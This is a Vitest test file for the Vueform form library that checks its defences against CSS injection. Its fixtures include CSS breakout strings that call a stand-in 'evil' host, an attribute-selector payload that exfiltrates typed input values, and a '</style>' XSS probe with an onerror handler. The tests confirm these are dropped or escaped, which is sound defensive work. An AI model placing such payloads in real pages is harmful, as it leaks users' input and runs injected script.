import {
  createVueform,
  defineSchema,
  model,
  security,
  theme,
} from '@vueform/core'
/**
 * # CSS injection containment
 *
 * Threat model: several schema-reachable values are interpolated into the text
 * of rendered `<style>` tags — per-instance token overrides (the `tokens`
 * prop), grid column widths, and the matrix's `grid-template-columns`. A value
 * like `red}[data-secret]{background:url(…)` would close the scoped rule and
 * inject arbitrary selectors, enabling attribute-selector exfiltration of typed
 * input values. The guarantees: declarations that could break out of their rule
 * are dropped (never rendered), and the SSR style-tag string cannot be closed
 * early by CSS content. (Nonce plumbing — a deployment guarantee, not an attack
 * surface — is covered in `integration/presentation/csp-nonce.test.ts`.)
 */
import { nextTick } from 'vue'

import { createForm } from '../../helpers'

describe('Security: CSS injection containment', () => {
  describe('token declarations', () => {
    /**
     * Threat: a schema `tokens` value containing `}` breaking out of the
     * per-instance scoped rule.
     *
     * Measure: token values carrying `{`/`}` are dropped with a dev warning
     * before the CSS string is built.
     *
     * Verified red→green: the breakout selector reached the style text before
     * the fix.
     */
    test('it should drop token values containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: {
              primary: 'red}body{background:url(//evil/x)',
            } as any,
          },
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('must not contain `{` or `}`')
      )

      warn.mockRestore()
    })

    /**
     * Threat: a hostile token KEY — `normalizeThemeKey` does not constrain
     * characters, so a key like `x;}body{…` would survive into the declaration
     * position.
     *
     * Measure: normalized keys must match plain `--vf-*` names or the
     * declaration is dropped.
     */
    test('it should drop token keys that do not normalize to plain names', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: {
              'x:red;}body{background:url(//evil/x);}': 'red',
            } as any,
          },
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(expect.stringContaining('was dropped'))

      warn.mockRestore()
    })

    /**
     * Threat: over-blocking — legitimate token overrides (including the shipped
     * data-URI icon values, which are percent-encoded and brace-free) must keep
     * working.
     *
     * Measure: ordinary values pass through into the scoped style rule.
     */
    test('it should keep legitimate token values', async () => {
      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: { primary: 'rgb(1, 2, 3)' } as any,
          },
        }),
      })

      await nextTick()

      const css = form
        .findAll('style')
        .map((s) => s.text())
        .join('\n')
      expect(css).toContain('--vf-primary:rgb(1, 2, 3)')
    })
  })

  describe('grid and matrix layout values', () => {
    /**
     * Threat: grid `widths` strings breaking out of the grid's scoped rule.
     *
     * Measure: brace-carrying width values are dropped (the column falls back
     * to its default sizing).
     */
    test('it should drop grid width values containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          g: {
            type: 'grid',
            cols: 1,
            widths: ['1fr}body{background:url(//evil/x)'],
            grid: [['cell']],
          } as any,
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('must not contain `{` or `}`')
      )

      warn.mockRestore()
    })

    /**
     * Threat: the matrix's `gridTemplateColumns` prop (string or function
     * result) — the same breakout through a different blueprint.
     *
     * Measure: the resolved template string is validated before interpolation.
     */
    test('it should drop matrix gridTemplateColumns containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          m: {
            type: 'matrix',
            cols: [{ value: 'a', label: 'A' }],
            rows: 1,
            inputType: 'radio',
            gridTemplateColumns: '1fr}body{background:url(//evil/x)',
          } as any,
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')

      warn.mockRestore()
    })
  })

  describe('the global theme stylesheet', () => {
    /**
     * Threat: a global `tokens` config value carrying `{`/`}` — the theme
     * stylesheet interpolates declarations verbatim, so a brace could close the
     * `:root` rule and open an attacker-chosen selector (e.g. attribute
     * selectors exfiltrating typed input values). This path is developer-config
     * trust, but the validation applies to every site that builds CSS text, so
     * the guarantee has no asymmetric gap.
     *
     * Measure: the same key/value validation as element-level tokens
     * (`isSafeThemeDecl`) — brace-bearing declarations are dropped with a dev
     * warning.
     *
     * Verified red→green: the breakout selector reached the stylesheet before
     * the fix.
     */
    test('it should drop brace-bearing global token values from the theme stylesheet', () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const vueform = createVueform({
        modules: { model, security, theme },
        tokens: {
          primary: 'red',
          evil: 'blue } input[value^="a"] { background: url(//evil/?a) ',
        },
      } as any)

      const tag = vueform.getStyleTag()

      expect(tag).toContain('--vf-primary')
      expect(tag).not.toContain('evil')
      expect(tag).not.toContain('input[value')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('`evil` was dropped')
      )

      warn.mockRestore()
    })

    /**
     * Threat: the SSR path. `getStyleTag()` returns a raw HTML string the
     * server splices into the document — a `</style>` sequence inside the CSS
     * (e.g. from a token value) would close the element early and everything
     * after it would parse as markup.
     *
     * Measure: `</` is escaped to `<\/` in the returned CSS text (a valid CSS
     * string escape), so the only `</` in the output is the closing tag
     * itself.
     */
    test('it should not allow CSS to close the SSR style tag early', () => {
      const vueform = createVueform({
        modules: { model, security, theme },
        nonce: 'ssr-nonce-1',
        tokens: {
          probe: 'url("a</style><img src=x onerror=alert(1)>")',
        },
      } as any)

      const tag = vueform.getStyleTag()

      expect(tag.startsWith('<style')).toBe(true)
      expect(tag.endsWith('</style>')).toBe(true)

      // Everything between the opening tag and the final closing tag must be
      // free of `</` — the escape leaves `<\/` instead.
      const inner = tag.slice(tag.indexOf('>') + 1, tag.lastIndexOf('</style>'))
      expect(inner).not.toContain('</')
      expect(inner).toContain('probe')
    })
  })
})
